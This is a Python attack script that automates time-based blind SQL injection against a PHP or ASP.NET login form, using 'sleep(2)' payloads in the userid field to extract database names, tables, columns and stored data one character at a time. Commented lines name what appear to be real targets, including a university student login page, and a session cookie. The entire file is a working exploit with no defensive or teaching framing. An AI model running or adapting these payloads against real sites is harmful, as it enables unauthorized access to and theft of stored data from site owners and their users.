import time
import requests

#url = 'http://104.197.42.200/member/login_ok.php'
#url = 'https://stud.inje.ac.kr/AuthUser.aspx'
#cookies = {'PHPSESSID':'d42rp6qqm5fhj3dmn3830g74pq'}
keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
showDataBase = 'SELECT DISTINCT table_schema FROM INFORMATION_SCHEMA.TABLES'

def find_db_length(url, cookies):
	db_len = 0
	while 1:
		db_len += 1
		value = "' or 1=1 and length(database())={} and sleep(2)#".format(db_len) 
		params = {'userid': value, 'userpw': 'test'}
		start = time.time()
		response = requests.post(url,data=params, cookies=cookies)
	#	print(response.content)
		print(value)
		if time.time() - start > 2: 
			break
	return db_len 

def find_db_name(url, cookies):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
#			value = "' or 1=1 and binary(substring(database(),{},1))= '{}' and sleep(2)#".format(i + 1, key)
			value = "' or 1=1 and binary(substring((select distinct table_schema from information_schema.tables limit {},1),{},1))= '{}' and sleep(2)#".format(size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

def find_table_name(url, cookies, db_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='{}' limit {},1),{},1)='{}' and sleep(2)#".format(db_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

def find_column_name(url, cookies, table_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)='{}' and sleep(2)#".format(table_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

def find_data(url, cookies, table_name, column_name):
	result = ''
	list = []
	size = 0
	i = 1
	while 1:
		for key in keyword:
			value = "' or 1=1 and substring((select {} from {} limit {},1),{},1)='{}' and sleep(2)#".format(column_name, table_name, size, i, key)
			params = {'userid': value, 'userpw': 'test'}
			start = time.time()
			response = requests.post(url,data=params, cookies=cookies)
			#print(response.content)
			print(value)
			if time.time() - start > 2:
				result += key
				i += 1
				break
			if(i == 1 and key == '0'):
				return list
			if key == '0':
				list.append(result)
				result = ''
				i = 1
				size += 1
	return list

if __name__ == '__main__':
#	db_length = find_db_length()
#	print("DB length = "+ str(db_length))
	db_name = find_db_name()
	for i in db_name:
		print(i)
	# table_name = find_table_name(db_name)
	# for i in table_name:
	# 	print(i)
	# column_name = {}
	# for table in table_name:
	# 	column_name[table] = find_column_name(table)
	# for item in column_name.items():
	# 	print(item)
	# data = {}
	# for table in table_name:
	# 	for key in column_name[table]:
	# 		data[key] = find_data(table, key)
	
	# print("============================")
	# print("DB length = "+ str(db_length))
	# print("DB NAME = "+ db_name)
	# print("TABLE NAME ================ ")
	# for i in table_name:
	# 	print(i)
	# print("COLUMN NAME =============== ")
	# for item in column_name.items():
	# 	print(item)
	# print("data ======================")
	# for table in table_name:
	# 	print(table + "테이블의 데이터")
	# 	for column in column_name[table]:
	# 		print(column + ": ", end="")
	# 		print(data[column])
	# print("============================")